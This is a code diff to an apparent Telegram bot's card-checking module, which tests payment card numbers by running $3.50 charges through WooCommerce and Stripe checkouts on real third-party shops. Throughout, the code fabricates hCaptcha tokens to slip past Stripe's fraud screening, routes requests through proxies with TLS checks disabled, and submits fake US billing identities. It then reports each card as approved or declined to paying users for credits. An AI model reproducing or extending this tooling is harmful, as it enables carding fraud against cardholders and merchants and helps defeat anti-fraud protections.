EFUVzcyWkc5d3ZRejhsdjY0bWpJTnlXMVh5d0U1djRWcVZkMitYcnU0eExybnkvY2hLSHNSdkxncUwvVjRETk1ua0JERGY5YmlrZjM0alN5SnZhUkZPWlZnYkZkVS9RcHNUcFVzdWwrQURMNUZRRUMwNFVRVFRWeG5oU0YvajFCdFdZSVNCcXdCaGxSZFdmWWxzb3JaOHR5SlRoS2Z3M1ZYL0hzMUpqcDNuZms4Q1pBUk93SlFBTDFjZEFSOGhpZzVhYVdWK3hIanZoaC9jL2RvVG00aHNXTGNucXhLeElmUXpoTEh5OVl6ZEFUN1habkFIaFpOVTh0NmgxaFR6NWs5WlA0dStmUzduRzNHTHBWU0duaWRkMk9pd0VhaEtpLzNIU0NhUFBvVDRQVTBzZ2xib2xUVXN1Z2FqMVRtcThnVUREYTRISVUrTy9RRXR0Y3VKQnFjVnZNVkw5QnRSeVJIVmFFQXg2NWk4NmI4OE9FanlXaFo3eFFHUEhSMWtEc3hMSWV2RkhUM2N0dXk0NExBRSt1cUFpN3R2aExOZUdQWHpxMFZEOTJJSWlXSzhzNlo0cDVQcmk3R2tvN3hmcEdUSHBIUDBCYktLYVZzMHJhaVF0QWIxZEhNVFZBZ3o1M3lQSzI1NHlZQkIwSjZnUjhRR1M2SFZaYWhYNTlFQjJ2VVZYR1NSMG5MSE5pMlczbDV1bWsvaXZPV0p0RjVVMzJ3NTFNR05UWEdMSkp6djFuRzN5TmR5Vzg3U3BjZkxPTXE1ODI0bVFNaTNmRXlvMXFHbG9uV2dtUUc4UWpxMG1LN1QrTmpxMWZvenFwOTVkNWxkU2p4NkkweVNKQjJNcDF4ZHFwZGpEa3NDZWliTHFaejZXYTA0N1lFWE55SWFGUXZyMUt2amZoUU1FdmFMMDRHa3pVRmhhejE3OCt1cWZGbU9SQlRZT0M1RlRhRkQ4Ny9EZmxFVlZyK3hTM0pqaTRiTVlzQXM3M1RMQWJYVTdPOWZTanRCM0tNTlk1NzJxeENNajE4cEZ6Yk9Ia2RNcWZPeEJUcFB0SHcxUnJ3S0FmRVRQOEN3c3psRHFjTk5RK0tqNzgxODFqZnc0Q2ZKTm9neTlNVFNwY3ZJNWVHYmRwazlLeEJBRVBaNFpJYkVLcWdrU0xuYTRBVnl0R1RBRTRRUHBLZ1ZkRFhJYmpEcHJMMlRSZnJqYks5ZE42SjRWdWNORG9CIiwia3IiOiI3YWYxZjM5Iiwic2hhcmRfaWQiOjI1OTE4OTM1OX0.98JLY8ZnsJSJn12v_ac90b2qDX_dWTRBVPZQVgh1HSI'
+                '_stripe_version': '2022-08-01',
             }
+
+            # Add hCaptcha token if available
+            hcaptcha_token = 'P1_' + ''.join(random.choices(string.ascii_letters + string.digits, k=200))
+            payment_data['radar_options[hcaptcha_token]'] = hcaptcha_token
 
             stripe_headers = {
                 "User-Agent": self.user_agent,
@@ -801,7 +900,7 @@ class StripeCharge3Checker:
                 "Referer": "https://js.stripe.com/",
             }
 
-            # Use separate client for Stripe (no proxy needed for Stripe API)
+            # Use separate client for Stripe API
             async with httpx.AsyncClient(http1=True, verify=False) as stripe_client:
                 response = await stripe_client.post(
                     "https://api.stripe.com/v1/payment_methods",
@@ -815,7 +914,7 @@ class StripeCharge3Checker:
                 payment_method_id = result.get('id')
                 if payment_method_id:
                     logger.success(f"Payment method created: {payment_method_id}")
-                    return {'success': True, 'payment_method_id': payment_method_id}
+                    return {'success': True, 'payment_method_id': payment_method_id, 'full_response': result}
                 else:
                     return {'success': False, 'error': 'No payment method ID'}
             else:
@@ -829,62 +928,12 @@ class StripeCharge3Checker:
         except Exception as e:
             return {'success': False, 'error': f"Payment method error: {str(e)}"}
 
-    async def get_elements_session(self):
-        """Get Stripe elements session for deferred intent"""
-        try:
-            logger.step(6, 7, "Getting Stripe elements session...")
-            
-            # Generate stripe_js_id if not present
-            stripe_js_id = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
-            
-            # Build elements session URL exactly as in stripe3.txt
-            elements_url = (
-                f"https://api.stripe.com/v1/elements/sessions?"
-                f"client_betas[0]=card_country_event_beta_1&"
-                f"deferred_intent[mode]=payment&"
-                f"deferred_intent[amount]=300&"  # $3.00 in cents
-                f"deferred_intent[currency]=cad&"
-                f"currency=cad&"
-                f"key={self.stripe_key}&"
-                f"_stripe_account={self.stripe_account}&"
-                f"elements_init_source=stripe.elements&"
-                f"referrer_host=ippoipponurse.com&"
-                f"stripe_js_id={stripe_js_id}&"
-                f"locale=en&"
-                f"type=deferred_intent"
-            )
-
-            elements_headers = {
-                "User-Agent": self.user_agent,
-                "Accept": "application/json",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Origin": "https://js.stripe.com",
-                "Referer": "https://js.stripe.com/",
-            }
-
-            async with httpx.AsyncClient(http1=True, verify=False) as stripe_client:
-                response = await stripe_client.get(
-                    elements_url,
-                    headers=elements_headers,
-                    timeout=30.0
-                )
-
-            if response.status_code == 200:
-                logger.success("Elements session created successfully")
-                return {'success': True}
-            else:
-                return {'success': False, 'error': f"Elements session failed: {response.status_code}"}
-
-        except Exception as e:
-            logger.error(f"Elements session error: {str(e)}")
-            return {'success': False, 'error': f"Elements session error: {str(e)}"}
-
     async def process_checkout(self, user_info, payment_method_id):
-        """Process checkout with detailed logging"""
+        """Process checkout with terms acceptance"""
         try:
-            logger.step(7, 7, "Processing checkout...")
+            logger.step(7, 7, "Processing checkout with terms accepted...")
 
-            # Build checkout data exactly as in stripe3.txt
+            # Build checkout data (from network data format)
             checkout_data = {
                 'wc-ajax': 'checkout',
                 'wc_order_attribution_source_type': 'typein',
@@ -898,7 +947,7 @@ class StripeCharge3Checker:
                 'wc_order_attribution_utm_source_platform': '(none)',
                 'wc_order_attribution_utm_creative_format': '(none)',
                 'wc_order_attribution_utm_marketing_tactic': '(none)',
-                'wc_order_attribution_session_entry': 'https://ippoipponurse.com/',
+                'wc_order_attribution_session_entry': 'https://finaticspetcenter.com/my-account/',
                 'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                 'wc_order_attribution_session_pages': '11',
                 'wc_order_attribution_session_count': '1',
@@ -906,7 +955,7 @@ class StripeCharge3Checker:
                 'billing_first_name': user_info['first_name'],
                 'billing_last_name': user_info['last_name'],
                 'billing_company': '',
-                'billing_country': user_info['country'],
+                'billing_country': 'US',
                 'billing_address_1': user_info['address'],
                 'billing_address_2': '',
                 'billing_city': user_info['city'],
@@ -914,26 +963,15 @@ class StripeCharge3Checker:
                 'billing_postcode': user_info['postcode'],
                 'billing_phone': user_info['phone'],
                 'billing_email': user_info['email'],
-                'shipping_first_name': '',
-                'shipping_last_name': '',
-                'shipping_company': '',
-                'shipping_country': user_info['country'],
-                'shipping_address_1': '',
-                'shipping_address_2': '',
-                'shipping_city': '',
-                'shipping_state': '',
-                'shipping_postcode': '',
                 'order_comments': '',
-                'payment_method': 'woocommerce_payments',
-                'cr_customer_consent': 'on',
-                'cr_customer_consent_field': '1',
-                'terms': 'on',
+                'coupon_code': '',
+                'payment_method': 'stripe_cc',
+                'stripe_cc_token_key': payment_method_id,
+                'stripe_cc_payment_intent_key': '',
+                'terms': 'on',  # Accept terms and conditions
                 'terms-field': '1',
                 'woocommerce-process-checkout-nonce': self.checkout_nonce or '',
-                '_wp_http_referer': '/?wc-ajax=update_order_review',
-                'wcpay-payment-method': payment_method_id,
-                'wcpay-fingerprint': f"{random.randint(10000000, 99999999)}3f8c67ac242f731e98ca7176",
-                'wcpay-fraud-prevention-token': ''
+                '_wp_http_referer': f'{self.base_url}/checkout/?elementorPageId=13944&elementorWidgetId=40b2faa5'
             }
 
             checkout_headers = {
@@ -941,10 +979,12 @@ class StripeCharge3Checker:
                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                 "X-Requested-With": "XMLHttpRequest",
                 "Origin": self.base_url,
-                "Referer": f"{self.base_url}/checkout-2/",
+                "Referer": f"{self.base_url}/checkout/",
             }
 
             response = await self.make_request_with_retry('POST', f"{self.base_url}/?wc-ajax=checkout", headers=checkout_headers, data=checkout_data)
+
+            response_text = response.text
 
             if response.status_code != 200:
                 logger.error(f"Checkout failed with status: {response.status_code}")
@@ -959,7 +999,7 @@ class StripeCharge3Checker:
                 result = response.json()
 
                 if isinstance(result, dict):
-                    # CHECK: If this is a 3D Secure or deferred payment
+                    # Check if this is a 3D Secure response
                     if self.is_secure_required_response(result):
                         logger.warning("🔐 3D Secure/Deferred payment detected - marking as DECLINED")
                         return {
@@ -984,7 +1024,7 @@ class StripeCharge3Checker:
                         return {
                             'success': True,
                             'status': 'APPROVED',
-                            'message': 'Successfully Charged $3.00'
+                            'message': 'Successfully Charged $3.50'
                         }
 
                     if result.get('result') == 'failure':
@@ -1024,7 +1064,7 @@ class StripeCharge3Checker:
             except json.JSONDecodeError as json_error:
                 logger.error(f"JSON parse error: {json_error}")
 
-                decline_message = self.extract_error_from_html(response.text)
+                decline_message = self.extract_error_from_html(response_text)
                 if decline_message and decline_message != "Payment declined":
                     logger.warning(f"Extracted error from HTML: {decline_message}")
                     return {
@@ -1048,63 +1088,67 @@ class StripeCharge3Checker:
                 'message': f"Processing error: {str(e)[:100]}"
             }
 
-    async def make_request_with_retry(self, method, url, max_retries=3, **kwargs):
-        """Make request with retry logic for VPS compatibility"""
-        last_exception = None
-        
-        for attempt in range(max_retries):
-            try:
-                if attempt > 0:
-                    logger.warning(f"Retry attempt {attempt}/{max_retries} for {url}")
-                    await asyncio.sleep(1.5 * attempt)
-                
-                headers = kwargs.get('headers', {}).copy()
-                
-                # Merge with base headers
-                base_headers = self.get_base_headers()
-                for key, value in base_headers.items():
-                    if key not in headers:
-                        headers[key] = value
-                
-                # Update dynamic headers
-                headers['User-Agent'] = self.user_agent
-                headers['Accept-Language'] = self.accept_language
-                
-                kwargs['headers'] = headers
-
-                response = await self.client.request(method, url, **kwargs)
-                
-                # Store cookies from response
-                if response.cookies:
-                    for name, value in response.cookies.items():
-                        self.cookies[name] = value
-                        if name == '__stripe_mid':
-                            self.__stripe_mid = value
-                        elif name == '__stripe_sid':
-                            self.__stripe_sid = value
-                        elif name == 'woocommerce_cart_hash':
-                            self.woocommerce_cart_hash = value
-                        elif name == 'wp_woocommerce_session':
-                            self.wp_woocommerce_session = value
-                
-                return response
-                
-            except (httpx.ConnectError, httpx.NetworkError, httpx.ProtocolError) as e:
-                last_exception = e
-                logger.warning(f"Connection error on attempt {attempt + 1}: {str(e)}")
-                if attempt < max_retries - 1:
-                    continue
+    async def confirm_payment_intent(self, payment_method_id, client_secret):
+        """Confirm payment intent if needed"""
+        try:
+            logger.step(8, 8, "Confirming payment intent...")
+            
+            # Extract payment intent ID from client_secret
+            pi_id_match = re.search(r'(pi_[a-zA-Z0-9]+)_secret_', client_secret)
+            if not pi_id_match:
+                return {'success': False, 'status': 'DECLINED', 'message': 'Invalid client secret'}
+            
+            pi_id = pi_id_match.group(1)
+            
+            # Generate hCaptcha token
+            hcaptcha_token = 'P1_' + ''.join(random.choices(string.ascii_letters + string.digits, k=300))
+            
+            confirm_data = {
+                'return_url': f"{self.base_url}/checkout/?key=wc_order_433yRFqCHMtt3&order_id=997213&_stripe_payment_method=stripe_cc",
+                'payment_method': payment_method_id,
+                'expected_payment_method_type': 'card',
+                'radar_options[hcaptcha_token]': hcaptcha_token,
+                'use_stripe_sdk': 'true',
+                'key': self.stripe_key,
+                '_stripe_account': self.stripe_account,
+                '_stripe_version': '2022-08-01',
+                'client_secret': client_secret
+            }
+            
+            confirm_headers = {
+                "User-Agent": self.user_agent,
+                "Accept": "application/json",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Origin": "https://js.stripe.com",
+                "Referer": "https://js.stripe.com/",
+            }
+            
+            async with httpx.AsyncClient(http1=True, verify=False) as stripe_client:
+                response = await stripe_client.post(
+                    f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
+                    data=confirm_data,
+                    headers=confirm_headers,
+                    timeout=30.0
+                )
+            
+            if response.status_code == 200:
+                result = response.json()
+                if result.get('status') == 'succeeded':
+                    return {'success': True, 'status': 'APPROVED', 'message': 'Successfully Charged $3.50'}
+                elif result.get('status') == 'requires_action':
+                    return {'success': True, 'status': 'DECLINED', 'message': '3D SECURE❎'}
                 else:
-                    raise last_exception
-            except httpx.TimeoutException as e:
-                last_exception = e
-                logger.warning(f"Timeout on attempt {attempt + 1}")
-                if attempt < max_retries - 1:
-                    continue
-                else:
-                    raise last_exception
-        
-        raise last_exception if last_exception else Exception("All retry attempts failed")
+                    return {'success': False, 'status': 'DECLINED', 'message': 'Payment declined'}
+            elif response.status_code == 402:
+                error_data = response.json()
+                error_msg = error_data.get('error', {}).get('message', 'Your card was declined')
+                return {'success': False, 'status': 'DECLINED', 'message': error_msg}
+            else:
+                return {'success': False, 'status': 'DECLINED', 'message': f'Stripe error: {response.status_code}'}
+                
+        except Exception as e:
+            logger.error(f"Payment confirmation error: {str(e)}")
+            return {'success': False, 'status': 'DECLINED', 'message': f'Confirmation error: {str(e)[:80]}'}
 
     async def check_card(self, card_details, username, user_data):
         """Main card checking method with proxy integration"""
@@ -1114,10 +1158,10 @@ class StripeCharge3Checker:
         
         # Mask card for logging
         card_masked = card_details[:12] + "XXXX" + card_details[-4:] if len(card_details) > 4 else card_details
-        logger.info(f"🔍 Starting Stripe Charge $3.00 check: {card_masked}")
+        logger.info(f"🔍 Starting Stripe Charge $3.50 check: {card_masked}")
 
-        # Step 0: Get proxy for user (INTEGRATED FROM SHOPIFY.PY)
-        logger.step(0, 7, "Getting proxy...")
+        # Step 0: Get proxy for user
+        logger.step(0, 8, "Getting proxy...")
         
         if not PROXY_SYSTEM_AVAILABLE:
             logger.error("Proxy system not available")
@@ -1135,7 +1179,7 @@ class StripeCharge3Checker:
         ssl_context.verify_mode = ssl.CERT_NONE
         ssl_context.set_ciphers('DEFAULT@SECLEVEL=1')
         
-        # VPS FIX: Initialize httpx client with HTTP/1.1 only and proper SSL
+        # Initialize httpx client with HTTP/1.1 only
         try:
             self.client = httpx.AsyncClient(
                 proxy=self.proxy_url,
@@ -1153,7 +1197,7 @@ class StripeCharge3Checker:
             mark_proxy_failed(self.proxy_url)
             return await self.format_response("", "", "", "", "ERROR", f"Client init failed: {str(e)}", username, time.time()-start_time, user_data)
         
-        # Test the proxy quickly with retry
+        # Test the proxy
         start_test = time.time()
         proxy_working = False
         
@@ -1200,21 +1244,21 @@ class StripeCharge3Checker:
                 return await self.format_response("", "", "", "", "ERROR", "Invalid card format. Use: CC|MM|YY|CVV", username, time.time()-start_time, user_data)
 
             cc = cc_parts[0].strip().replace(" ", "")
-            mes = cc_parts[1].strip()
+            mes = cc_parts[1].strip().zfill(2)
             ano = cc_parts[2].strip()
             cvv = cc_parts[3].strip()
 
             if not cc.isdigit() or len(cc) < 15:
-                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card number", username, time.time()-start_time, user_data, bin_info)
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card number", username, time.time()-start_time, user_data)
 
             if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
-                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid month", username, time.time()-start_time, user_data, bin_info)
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid month", username, time.time()-start_time, user_data)
 
             if not ano.isdigit() or len(ano) not in [2, 4]:
-                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid year", username, time.time()-start_time, user_data, bin_info)
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid year", username, time.time()-start_time, user_data)
 
             if not cvv.isdigit() or len(cvv) not in [3, 4]:
-                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time, user_data, bin_info)
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time, user_data)
 
             if len(ano) == 2:
                 ano = '20' + ano
@@ -1222,14 +1266,12 @@ class StripeCharge3Checker:
             bin_info = await self.get_bin_info(cc)
             logger.bin_info(f"BIN: {cc[:6]} | {bin_info['scheme']} - {bin_info['type']} | {bin_info['bank']} | {bin_info['country']} [{bin_info['emoji']}]")
 
-            # Get US address from the list
+            # Get US address
             address_info = random.choice(self.us_addresses)
             
             # Generate random email if needed
             random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
-            email = address_info['email']  # Use the provided email or generate one
-            if random.random() > 0.5:  # 50% chance to generate random email
-                email = f"{random_string}@gmail.com"
+            email = address_info.get('email', f"{random_string}@gmail.com")
 
             user_info = {
                 'first_name': address_info['first_name'],
@@ -1239,8 +1281,7 @@ class StripeCharge3Checker:
                 'city': address_info['city'],
                 'postcode': address_info['postcode'],
                 'phone': address_info['phone'],
-                'state': address_info['state'],
-                'country': address_info['country']
+                'state': address_info['state']
             }
 
             logger.user(f"User: {user_info['first_name']} {user_info['last_name']} | {email} | {user_info['phone']}")
@@ -1249,36 +1290,38 @@ class StripeCharge3Checker:
             if not await self.initialize_session():
                 return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Failed to initialize session", username, time.time()-start_time, user_data, bin_info)
 
-            # Step 2: Add product to cart
-            add_success, error = await self.add_product_to_cart()
-            if not add_success:
-                return await self.format_response(cc, mes, ano, cvv, "DECLINED", error, username, time.time()-start_time, user_data, bin_info)
+            # Step 2: Get wishlist data
+            await self.get_woosw_button()
 
-            # Step 3: Load checkout page and extract nonces
+            # Step 3: Select variation and add to cart
+            add_success, error = await self.select_variation()
+            if not add_success:
+                return await self.format_response(cc, mes, ano, cvv, "DECLINED", error or "Failed to add to cart", username, time.time()-start_time, user_data, bin_info)
+
+            # Step 4: Load checkout page and extract nonces
             checkout_success, checkout_error = await self.get_checkout_page()
             if not checkout_success:
                 return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Checkout page error: {checkout_error}", username, time.time()-start_time, user_data, bin_info)
 
-            # Step 4: Update order review with US address
-            update_success, update_result = await self.update_order_review(user_info)
+            # Step 5: Update order review with US address
+            update_success, update_error = await self.update_order_review(user_info)
             if not update_success:
-                return await self.format_response(cc, mes, ano, cvv, "DECLINED", update_result, username, time.time()-start_time, user_data, bin_info)
+                return await self.format_response(cc, mes, ano, cvv, "DECLINED", update_error or "Update order review failed", username, time.time()-start_time, user_data, bin_info)
 
-            # Step 5: Create Stripe payment method
+            # Step 6: Create Stripe payment method
             payment_result = await self.create_stripe_payment_method((cc, mes, ano, cvv), user_info)
             if not payment_result['success']:
                 error_msg = payment_result['error']
                 logger.warning(f"Payment method creation failed: {error_msg}")
                 return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_msg, username, time.time()-start_time, user_data, bin_info)
 
-            # Step 6: Get Stripe elements session
-            elements_result = await self.get_elements_session()
-            if not elements_result['success']:
-                logger.warning(f"Elements session creation failed: {elements_result.get('error')}")
-                # Continue anyway - may still work without it
-
-            # Step 7: Process checkout
+            # Step 7: Process checkout with terms accepted
             result = await self.process_checkout(user_info, payment_result['payment_method_id'])
+
+            # Step 8: If payment requires confirmation, handle it
+            if result.get('requires_confirmation') and result.get('client_secret'):
+                confirm_result = await self.confirm_payment_intent(payment_result['payment_method_id'], result['client_secret'])
+                result = confirm_result
 
             elapsed_time = time.time() - start_time
             logger.success(f"Card check completed in {elapsed_time:.2f}s - Status: {result['status']} - Message: {result['message']}")
@@ -1306,79 +1349,7 @@ class StripeCharge3Checker:
                 except:
                     pass
 
-    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
-        """Format response matching scharge1.py style with trimmed message"""
-        if bin_info is None:
-            bin_info = await self.get_bin_info(cc)
-        
-        safe_bin_info = {
-            'scheme': str(bin_info.get('scheme', 'N/A')),
-            'type': str(bin_info.get('type', 'N/A')),
-            'brand': str(bin_info.get('brand', 'N/A')),
-            'bank': str(bin_info.get('bank', 'N/A')) if bin_info.get('bank') else 'N/A',
-            'country': str(bin_info.get('country', 'N/A')),
-            'country_code': str(bin_info.get('country_code', 'N/A')),
-            'emoji': str(bin_info.get('emoji', '🏳️'))
-        }
-
-        user_id = user_data.get("user_id", "Unknown")
-        first_name = html.escape(str(user_data.get("first_name", "User")))
-        badge = user_data.get("plan", {}).get("badge", "🧿")
-
-        # Trim the message for display
-        trimmed_message = self.trim_error_message(str(message)) if message else ""
-
-        if any(pattern in trimmed_message.lower() for pattern in ["3d secure", "authentication required", "3ds", "requires_confirmation", "requires_action"]):
-            status_emoji = "❌"
-            status_text = "DECLINED"
-            message_display = "3D SECURE❎"
-        elif status == "APPROVED":
-            status_emoji = "✅"
-            status_text = "APPROVED"
-            message_display = "Successfully Charged $3.00"
-        else:
-            status_emoji = "❌"
-            status_text = "DECLINED"
-            message_display = trimmed_message if trimmed_message else "Payment declined"
-
-        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
-        user_display = f"「{badge}」{clean_name}"
-        
-        bank_info = safe_bin_info['bank'].upper() if safe_bin_info['bank'] != 'N/A' else 'N/A'
-
-        response = f"""<b>「$cmd → /xs」| <b>WAYNE</b> </b>
-━━━━━━━━━━━━━━━
-<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
-<b>[•] Gateway -</b> Stripe Charge $3.00
-<b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
-<b>[•] Response-</b> <code>{message_display}</code>
-━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
-<b>[+] Bin:</b> <code>{cc[:6]}</code>  
-<b>[+] Info:</b> <code>{safe_bin_info['scheme']} - {safe_bin_info['type']} - {safe_bin_info['brand']}</code>
-<b>[+] Bank:</b> <code>{bank_info}</code> 🏦
-<b>[+] Country:</b> <code>{safe_bin_info['country']}</code> [{safe_bin_info['emoji']}]
-━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
-<b>[ﾒ] Checked By:</b> {user_display}
-<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
-━━━━━━━━━━━━━━━
-<b>[ﾒ] T/t:</b> <code>{elapsed_time:.2f} 𝐬</code> |<b>P/x:</b> <code>{self.proxy_status}</code></b>"""
-
-        return response
-
-    def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
-        """Get processing message matching scharge1.py style"""
-        return f"""<b>「$cmd → /xs」| <b>WAYNE</b> </b>
-━━━━━━━━━━━━━━━
-<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
-<b>[•] Gateway -</b> Stripe Charge $3.00
-<b>[•] Status-</b> Processing... ⏳
-━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
-<b>[+] Plan:</b> {user_plan}
-<b>[+] User:</b> @{username}
-━━━━━━━━━━━━━━━
-<b>Checking card... Please wait.</b>"""
-
-# Command handler - MATCHING scharge1.py STYLE
+# Command handler
 @Client.on_message(filters.command(["xs", ".xs", "$xs"]))
 @auth_and_free_restricted
 async def handle_stripe_charge_3(client: Client, message: Message):
@@ -1386,7 +1357,7 @@ async def handle_stripe_charge_3(client: Client, message: Message):
         user_id = message.from_user.id
         username = message.from_user.username or str(user_id)
 
-        # CHECK: First check if command is disabled
+        # Check if command is disabled
         command_text = message.text.split()[0]
         command_name = command_text.lstrip('/.$')
 
@@ -1418,7 +1389,7 @@ async def handle_stripe_charge_3(client: Client, message: Message):
         user_plan = user_data.get("plan", {})
         plan_name = user_plan.get("plan", "Free")
 
-        # Check cooldown (owner is automatically skipped in check_cooldown function)
+        # Check cooldown
         can_use, wait_time = check_cooldown(user_id, "xs")
         if not can_use:
             await message.reply(f"""<pre>⏳ Cooldown Active</pre>
@@ -1434,18 +1405,17 @@ async def handle_stripe_charge_3(client: Client, message: Message):
             if charge_processor:
                 await message.reply(charge_processor.get_usage_message(
                     "xs", 
-                    "Stripe Charge $3.00",
+                    "Stripe Charge $3.50",
                     "4111111111111111|12|2025|123"
                 ))
             else:
-                await message.reply("""<pre>#WAYNE ─[STRIPE CHARGE $3.00]─</pre>
+                await message.reply("""<pre>#WAYNE ─[STRIPE CHARGE $3.50]─</pre>
 ━━━━━━━━━━━━━
 ⟐ <b>Command</b>: <code>/xs</code> or <code>.xs</code> or <code>$xs</code>
 ⟐ <b>Usage</b>: <code>/xs cc|mm|yy|cvv</code>
 ⟐ <b>Example</b>: <code>/xs 4111111111111111|12|2025|123</code>
 ━━━━━━━━━━━━━
-<b>~ Note:</b> <code>Charges $3.00 via Stripe gateway (Deducts 2 credits AFTER check completes)</code>
-<b>~ Note:</b> <code>Free users can use in authorized groups with credit deduction</code>""")
+<b>~ Note:</b> <code>Charges $3.50 via Stripe gateway (Deducts 2 credits AFTER check completes)</code>""")
             return
 
         card_details = args[1].strip()
@@ -1475,15 +1445,15 @@ async def handle_stripe_charge_3(client: Client, message: Message):
 ━━━━━━━━━━━━━""")
             return
 
-        # Show processing message - MATCHING scharge1.py STYLE
+        # Show processing message
         processing_msg = await message.reply(
             charge_processor.get_processing_message(
                 cc, mes, ano, cvv, username, plan_name, 
-                "Stripe Charge $3.00", "xs"
+                "Stripe Charge $3.50", "xs"
             ) if charge_processor else f"""<b>「$cmd → /xs」| <b>WAYNE</b> </b>
 ━━━━━━━━━━━━━━━
 <b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
-<b>[•] Gateway -</b> Stripe Charge $3.00
+<b>[•] Gateway -</b> Stripe Charge $3.50
 <b>[•] Status-</b> Processing... ⏳
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 <b>[+] Plan:</b> {plan_name}
@@ -1505,12 +1475,12 @@ async def handle_stripe_charge_3(client: Client, message: Message):
                 user_data,
                 credits_needed=2,
                 command_name="xs",
-                gateway_name="Stripe Charge $3.00"
+                gateway_name="Stripe Charge $3.50"
             )
 
             await processing_msg.edit_text(result, disable_web_page_preview=True)
         else:
-            # Fallback to old method if charge_processor not available
+            # Fallback
             result = await checker.check_card(card_details, username, user_data)
             await processing_msg.edit_text(result, disable_web_page_preview=True)
 
